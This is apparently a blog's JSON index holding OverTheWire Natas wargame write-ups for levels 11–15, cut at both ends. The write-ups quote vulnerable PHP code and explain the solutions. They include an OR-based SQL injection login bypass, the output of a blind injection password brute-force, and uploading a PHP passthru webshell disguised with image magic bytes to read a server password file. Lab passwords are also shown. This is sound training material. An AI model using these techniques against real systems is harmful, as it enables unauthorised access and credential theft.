Possible so far: 346cefhijkmostuvDEGKLMPQVWXY ----end of search---- Possible characters: 346cefhijkmostuvDEGKLMPQVWXY Password so far: h Password so far: hP Password so far: hPk Password so far: hPkj Password so far: hPkjK Password so far: hPkjKY Password so far: hPkjKYv Password so far: hPkjKYvi Password so far: hPkjKYviL Password so far: hPkjKYviLQ Password so far: hPkjKYviLQc Password so far: hPkjKYviLQct Password so far: hPkjKYviLQctE Password so far: hPkjKYviLQctEW Password so far: hPkjKYviLQctEW3 Password so far: hPkjKYviLQctEW33 Password so far: hPkjKYviLQctEW33Q Password so far: hPkjKYviLQctEW33Qm Password so far: hPkjKYviLQctEW33Qmu Password so far: hPkjKYviLQctEW33QmuX Password so far: hPkjKYviLQctEW33QmuXL Password so far: hPkjKYviLQctEW33QmuXL6 Password so far: hPkjKYviLQctEW33QmuXL6e Password so far: hPkjKYviLQctEW33QmuXL6eD Password so far: hPkjKYviLQctEW33QmuXL6eDV Password so far: hPkjKYviLQctEW33QmuXL6eDVf Password so far: hPkjKYviLQctEW33QmuXL6eDVfM Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4 Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo As you can see, we`ve got the password for the next level : hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n","date":"2024-08-23T15:10:52+03:00","permalink":"//localhost:1313/post/natas15/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 15"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas14\nPassword: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ\nURL: http://natas14.natas.labs.overthewire.org\nDoc What is SQL?\nStructured Query Language is a domain-specific language used to manage data, especially in a relational database management system. It is particularly useful in handling structured data, i.e., data incorporating relations among entities and variables.\nWhat is SQL injection?\nIn computing, SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.\nSolution This time, we are not prompted with the same login window as until now. We need to log in through a form and there is also the source code present. Source code:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas14\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas14\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;?php if(array_key_exists(\u0026#34;username\u0026#34;, $_REQUEST)) { $link = mysqli_connect(\u0026#39;localhost\u0026#39;, \u0026#39;natas14\u0026#39;, \u0026#39;\u0026lt;censored\u0026gt;\u0026#39;); mysqli_select_db($link, \u0026#39;natas14\u0026#39;); $query = \u0026#34;SELECT * from users where username=\\\u0026#34;\u0026#34;.$_REQUEST[\u0026#34;username\u0026#34;].\u0026#34;\\\u0026#34; and password=\\\u0026#34;\u0026#34;.$_REQUEST[\u0026#34;password\u0026#34;].\u0026#34;\\\u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;debug\u0026#34;, $_GET)) { echo \u0026#34;Executing query: $query\u0026lt;br\u0026gt;\u0026#34;; } if(mysqli_num_rows(mysqli_query($link, $query)) \u0026gt; 0) { echo \u0026#34;Successful login! The password for natas15 is \u0026lt;censored\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#34;Access denied!\u0026lt;br\u0026gt;\u0026#34;; } mysqli_close($link); } else { ?\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; Username: \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; What does this code do? The important selection out of all of that code is this:\n$query = \u0026#34;SELECT * from users where username=\\\u0026#34;\u0026#34;.$_REQUEST[\u0026#34;username\u0026#34;].\u0026#34;\\\u0026#34; and password=\\\u0026#34;\u0026#34;.$_REQUEST[\u0026#34;password\u0026#34;].\u0026#34;\\\u0026#34;\u0026#34;; It is not really that hard to understand if you have any experience with SQL. The code basically resumes to \u0026ldquo;ill look for any records that have the username and password as the ones you input for me\u0026rdquo;.\nAfterwards, we need to take a look at another part of the code, that being:\nif(mysqli_num_rows(mysqli_query($link, $query)) \u0026gt; 0) { echo \u0026#34;Successful login! The password for natas15 is \u0026lt;censored\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#34;Access denied!\u0026lt;br\u0026gt;\u0026#34;; } This part of the executions makes sure that your SELECT statement returns something and if it does, ouput the password for the next level.\nThis means that all we have to do is manipulate our input such that we select something, we dont care what we do. I taught of going for buzzwords like \u0026ldquo;admin\u0026rdquo; and \u0026ldquo;test\u0026rdquo; but that didn`t result into any finds. The next logic thing to do is try to execute some sql sequence that is not originally intended. The simplest way to achieve this is to run a TRUE=TRUE statement wich will always bring something up. It is also worth noting that the OR statement returns true if one of the inputs is true. Simplify the execution:\nSelect * from users where username=\u0026#34;variable1\u0026#34; and password=\u0026#34;variable2\u0026#34; Since we can`t do much with variable1, we could try pushing the \u0026quot; or commenting it in regards to out insert in variable2. Now let`s put all of this together in order to run an or statement.\nvariable1=idontcare variable2=idontcare\u0026#34; or \u0026#34;string\u0026#34;=\u0026#34;string This boils down the query to:\nSelect * from users where username=\u0026#34;idontcare\u0026#34; and password=\u0026#34;idontcare\u0026#34; or \u0026#34;string\u0026#34;=\u0026#34;string\u0026#34; Since \u0026ldquo;string\u0026rdquo; will always be equal to \u0026ldquo;string\u0026rdquo;, the query should return something.\nGood job!","date":"2024-08-22T14:17:44+03:00","permalink":"//localhost:1313/post/natas14/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 14"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas13\nPassword: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC\nURL: http://natas13.natas.labs.overthewire.org\nDoc Burp Suite is a proprietary software tool for security assessment and penetration testing of web applications. It software was initially developed in 2003-2006 by Dafydd Stuttard to automate his own security testing needs, after realizing the capabilities of automatable web tools like Selenium.\nSource.\nBurp Suite tutorial and usefull guides:\nPort Swigger.\nWhat is PHP injection?\nPHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.\nSolution So far, this seems like a 1 to 1 copy of natas12. The only noticeable difference being that this time, there is a line saying : For security reasons, we now only accept image files!. We can again take a look at the source code.\nSource code:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas13\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas13\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; For security reasons, we now only accept image files!\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;?php function genRandomString() { $length = 10; $characters = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz\u0026#34;; $string = \u0026#34;\u0026#34;; for ($p = 0; $p \u0026lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.\u0026#34;/\u0026#34;.genRandomString().\u0026#34;.\u0026#34;.$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(\u0026#34;filename\u0026#34;, $_POST)) { $target_path = makeRandomPathFromFilename(\u0026#34;upload\u0026#34;, $_POST[\u0026#34;filename\u0026#34;]); $err=$_FILES[\u0026#39;uploadedfile\u0026#39;][\u0026#39;error\u0026#39;]; if($err){ if($err === 2){ echo \u0026#34;The uploaded file exceeds MAX_FILE_SIZE\u0026#34;; } else{ echo \u0026#34;Something went wrong :/\u0026#34;; } } else if(filesize($_FILES[\u0026#39;uploadedfile\u0026#39;][\u0026#39;tmp_name\u0026#39;]) \u0026gt; 1000) { echo \u0026#34;File is too big\u0026#34;; } else if (! exif_imagetype($_FILES[\u0026#39;uploadedfile\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { echo \u0026#34;File is not an image\u0026#34;; } else { if(move_uploaded_file($_FILES[\u0026#39;uploadedfile\u0026#39;][\u0026#39;tmp_name\u0026#39;], $target_path)) { echo \u0026#34;The file \u0026lt;a href=\\\u0026#34;$target_path\\\u0026#34;\u0026gt;$target_path\u0026lt;/a\u0026gt; has been uploaded\u0026#34;; } else{ echo \u0026#34;There was an error uploading the file, please try again!\u0026#34;; } } } else { ?\u0026gt; \u0026lt;form enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;MAX_FILE_SIZE\u0026#34; value=\u0026#34;1000\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;filename\u0026#34; value=\u0026#34;\u0026lt;?php print genRandomString(); ?\u0026gt;.jpg\u0026#34; /\u0026gt; Choose a JPEG to upload (max 1KB):\u0026lt;br/\u0026gt; \u0026lt;input name=\u0026#34;uploadedfile\u0026#34; type=\u0026#34;file\u0026#34; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload File\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; What is the difference? This script performs additional checks on the uploaded files. It ensures the file is an image by using exif_imagetype().\nWhat can we do? exif_imagetype() reads the first bytes of an image and checks its signature.Source.\nJPEG files (compressed images) start with an image marker which always contains the marker code hex values FF D8 FF. It does not have a length of the file embedded, thus we need to find JPEG trailer, which is FF D9.Source.\nArmed with this at hand we can conclude that the solution is identical to the previous one, the only difference being that we should begin our payload with the signature bytes of a jpeg image. You can find the structure on the source hlink listed above.\nWhat should the content be? What is passthru?\nUtilizing the passthru function in php we should be able to run the target command on the machine and the only thing that remains to do is spit out the result with echo.\nAlso we should create a jpeg file that is less than 1kb to have it initially pass through.\n03:35:53 archie@Archie ~ → touch whatever.jpg Now we need to modify the package and insert the php code we`ve talked about earlier.\nMagic numbers are the first bits of a file which uniquely identify the type of file. This makes programming easier because complicated file structures need not be searched in order to identify the file type. For example, a jpeg file starts with ffd8 ffe0 0010 4a46 4946 0001 0101 0047 \u0026hellip;\u0026hellip;JFIF\u0026hellip;..G ffd8 shows that it\u0026rsquo;s a JPEG file, and ffe0 identify a JFIF type structure. There is an ascii encoding of \u0026ldquo;JFIF\u0026rdquo; which comes after a length code, but that is not necessary in order to identify the file. The first 4 bytes do that uniquely.\nSource.\nWe will basically insert the signature of the file into a new file and then append to it the php payload. 01:24:24 archie@Archie tmp → echo \u0026#34;GIF87a\u0026#34; \u0026gt;\u0026gt; whatever.jpg Now all there`s left to do is to modify the package in order for the server to percieve it as jpg even tho it is php and then upload it. We can see that the file has been uploaded, now opening it should get us to the source of the file and execute the php payload on the machine. Do not take into account the gif part as it is part of the signature of the file left as residual. The content after the space is the flag for natas14.\n","date":"2024-08-21T16:17:53+03:00","permalink":"//localhost:1313/post/natas13/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 13"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas12\nPassword: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB\nURL: http://natas12.natas.labs.overthewire.org\nDoc Burp Suite is a proprietary software tool for security assessment and penetration testing of web applications. It software was initially developed in 2003-2006 by Dafydd Stuttard to automate his own security testing needs, after realizing the capabilities of automatable web tools like Selenium.\nSource.\nBurp Suite tutorial and usefull guides:\nPort Swigger.\nWhat is PHP injection?\nPHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.\nSolution For the first time, the index page is asking us to upload a file to the service. We can again take a look at the source code.\nSource code:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas12\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas12\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;?php function genRandomString() { $length = 10; $characters = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz\u0026#34;; $string = \u0026#34;\u0026#34;; for ($p = 0; $p \u0026lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.\u0026#34;/\u0026#34;.genRandomString().\u0026#34;.\u0026#34;.$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(\u0026#34;filename\u0026#34;, $_POST)) { $target_path = makeRandomPathFromFilename(\u0026#34;upload\u0026#34;, $_POST[\u0026#34;filename\u0026#34;]); if(filesize($_FILES[\u0026#39;uploadedfile\u0026#39;][\u0026#39;tmp_name\u0026#39;]) \u0026gt; 1000) { echo \u0026#34;File is too big\u0026#34;; } else { if(move_uploaded_file($_FILES[\u0026#39;uploadedfile\u0026#39;][\u0026#39;tmp_name\u0026#39;], $target_path)) { echo \u0026#34;The file \u0026lt;a href=\\\u0026#34;$target_path\\\u0026#34;\u0026gt;$target_path\u0026lt;/a\u0026gt; has been uploaded\u0026#34;; } else{ echo \u0026#34;There was an error uploading the file, please try again!\u0026#34;; } } } else { ?\u0026gt; \u0026lt;form enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;MAX_FILE_SIZE\u0026#34; value=\u0026#34;1000\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;filename\u0026#34; value=\u0026#34;\u0026lt;?php print genRandomString(); ?\u0026gt;.jpg\u0026#34; /\u0026gt; Choose a JPEG to upload (max 1KB):\u0026lt;br/\u0026gt; \u0026lt;input name=\u0026#34;uploadedfile\u0026#34; type=\u0026#34;file\u0026#34; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload File\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Quick summary of the code The PHP code allows users to upload files by generating a unique file path for each upload, based on a random filename with the .jpg extension. It checks that the file size does not exceed 1KB and provides feedback if the file is too large or if the upload fails. If the file meets the criteria, it is moved to the designated path, and a link to the uploaded file is displayed.\nWhat can we do? As we did in the 5th level, we could use Burp Suite in order to intercept the package being sent before it reaches the host and make modifications to that package such that we could inject code that is not supposed to be run in normal conditions. Since the service uses PHP, the code we will inject and the file itself will be of php type.\nThe simplest solution that comes to mind is once again, to execute the cat command on the host with the target of /etc/natas_webpass/natas13.\nWhat should the content be? What is passthru?\nUtilizing the passthru function in php we should be able to run the target command on the machine and the only thing that remains to do is spit out the result with echo.\nAlso we should create a jpeg file that is less than 1kb to have it initially pass through.\n03:35:53 archie@Archie ~ → touch whatever.jpeg Now we need to modify the package and insert the php code we`ve talked about earlier.\nAfter all of this,we can see that the file has been succesfully uploaded with the php extension. Trying to open this file should execute the payload from passthru and get us in. ","date":"2024-08-21T15:19:34+03:00","permalink":"//localhost:1313/post/natas12/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 12"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas11\nPassword: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk\nURL: http://natas11.natas.labs.overthewire.org\nSolution Idea Tools CyberChef\nVery usefull site for encrypting and decrypting information.\nDoc What is encryption and decryption?\nEncryption is the process by which a readable message is converted to an unreadable form to prevent unauthorized parties from reading it. Decryption is the process of converting an encrypted message back to its original (readable) format. The original message is called the plaintext message. The encrypted message is called the ciphertext message.\nDigital encryption algorithms work by manipulating the digital content of a plaintext message mathematically, using an encryption algorithm and a digital key to produce a ciphertext version of the message. The sender and recipient can communicate securely if the sender and recipient are the only ones who know the key.\nWhat is XOR encryption?\nThe XOR operator is extremely common as a component in more complex ciphers. By itself, using a constant repeating key, a simple XOR cipher can trivially be broken using frequency analysis. If the content of any message can be guessed or otherwise known then the key can be revealed. Its primary merit is that it is simple to implement, and that the XOR operation is computationally inexpensive. A simple repeating XOR (i.e. using the same key for xor operation on the whole data) cipher is therefore sometimes used for hiding information in cases where no particular security is required. The XOR cipher is often used in computer malware to make reverse engineering more difficult.\nWhat are cookies?🍪\nCookies are small pieces of text sent to your browser by a website you visit. They help that website remember information about your visit, which can both make it easier to visit the site again and make the site more useful to you. My bad drawing skills expressed on a whiteboard: Solution Let`s begin by taking a close look at the first page. We are promted with a display that reads : Cookies are protected with XOR encryption and a prompt to that allows us to set the color of the webpage background (See the cookie doc if you have not yet). In order for the user to not lose his changes to the color of the page, the site uses cookies to store that information. It is clearly stated that the cookie data is encrypted using XOR encryption.\nIf you were to set the background color to any value including the default and take a look at what your browser stores about the page (Use inspect element) you will see something like this: Same stuff again, we have the source code listed in the right of the prompt. Let`s take a look at what happens behind the courtain and try to understand the code. Code in question: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas11\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;? $defaultdata = array( \u0026#34;showpassword\u0026#34;=\u0026gt;\u0026#34;no\u0026#34;, \u0026#34;bgcolor\u0026#34;=\u0026gt;\u0026#34;#ffffff\u0026#34;); function xor_encrypt($in) { $key = \u0026#39;\u0026lt;censored\u0026gt;\u0026#39;; $text = $in; $outText = \u0026#39;\u0026#39;; // Iterate through each character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\u0026#34;data\u0026#34;, $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\u0026#34;data\u0026#34;])), true); if(is_array($tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026#34;showpassword\u0026#34;, $tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026#34;bgcolor\u0026#34;, $tempdata)) { if (preg_match(\u0026#39;/^#(?:[a-f\\d]{6})$/i\u0026#39;, $tempdata[\u0026#39;bgcolor\u0026#39;])) { $mydata[\u0026#39;showpassword\u0026#39;] = $tempdata[\u0026#39;showpassword\u0026#39;]; $mydata[\u0026#39;bgcolor\u0026#39;] = $tempdata[\u0026#39;bgcolor\u0026#39;]; } } } return $mydata; } function saveData($d) { setcookie(\u0026#34;data\u0026#34;, base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(\u0026#34;bgcolor\u0026#34;,$_REQUEST)) { if (preg_match(\u0026#39;/^#(?:[a-f\\d]{6})$/i\u0026#39;, $_REQUEST[\u0026#39;bgcolor\u0026#39;])) { $data[\u0026#39;bgcolor\u0026#39;] = $_REQUEST[\u0026#39;bgcolor\u0026#39;]; } } saveData($data); ?\u0026gt; \u0026lt;h1\u0026gt;natas11\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;body style=\u0026#34;background: \u0026lt;?=$data[\u0026#39;bgcolor\u0026#39;]?\u0026gt;;\u0026#34;\u0026gt; Cookies are protected with XOR encryption\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;? if($data[\u0026#34;showpassword\u0026#34;] == \u0026#34;yes\u0026#34;) { print \u0026#34;The password for natas12 is \u0026lt;censored\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; } ?\u0026gt; \u0026lt;form\u0026gt; Background color: \u0026lt;input name=bgcolor value=\u0026#34;\u0026lt;?=$data[\u0026#39;bgcolor\u0026#39;]?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=submit value=\u0026#34;Set color\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Since this time, the code is pretty convoluted and not intuitive, we will brake it down in segments.\n$defaultdata = array(\u0026#34;showpassword\u0026#34; =\u0026gt; \u0026#34;no\u0026#34;, \u0026#34;bgcolor\u0026#34; =\u0026gt; \u0026#34;#ffffff\u0026#34;); It begins by defining a default array, $defaultdata, including 2 key pairs showpassword, bgcolor with values no and #ffffff respectively.\nfunction xor_encrypt($in) { $key = \u0026#39;\u0026lt;censored\u0026gt;\u0026#39;; $text = $in; $outText = \u0026#39;\u0026#39;; // Iterate through each character for($i=0; $i\u0026lt;strlen($text); $i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } This is where the magic happens, it is the function that outputs the result after the application of XOR encryption.\nfunction loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\u0026#34;data\u0026#34;, $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\u0026#34;data\u0026#34;])), true); if(is_array($tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026#34;showpassword\u0026#34;, $tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026#34;bgcolor\u0026#34;, $tempdata)) { if (preg_match(\u0026#39;/^#(?:[a-f\\d]{6})$/i\u0026#39;, $tempdata[\u0026#39;bgcolor\u0026#39;])) { $mydata[\u0026#39;showpassword\u0026#39;] = $tempdata[\u0026#39;showpassword\u0026#39;]; $mydata[\u0026#39;bgcolor\u0026#39;] = $tempdata[\u0026#39;bgcolor\u0026#39;]; } } } return $mydata; } The loadData function firstly initializes the variable $myData with default values and checks if the cookie exists. Afterwards, the script decodes the information from Base64, decrypts it using the xor_encrypt function and then decodes the resulting json. Remember this process, it will be usefull. The rest of the code is basic data and function validation.\nfunction saveData($d) { setcookie(\u0026#34;data\u0026#34;, base64_encode(xor_encrypt(json_encode($d)))); } This function stores the given array into a cookie🍪.\n$data = loadData($defaultdata); Basic populating function.\nif(array_key_exists(\u0026#34;bgcolor\u0026#34;, $_REQUEST)) { if (preg_match(\u0026#39;/^#(?:[a-f\\d]{6})$/i\u0026#39;, $_REQUEST[\u0026#39;bgcolor\u0026#39;])) { $data[\u0026#39;bgcolor\u0026#39;] = $_REQUEST[\u0026#39;bgcolor\u0026#39;]; } } And finally, this is the background color handling function.\nEnough with analizing what happens, let`s try to solve this level.\nFirstly, I will run the json encoding function on the default data in a php compiler in order to see 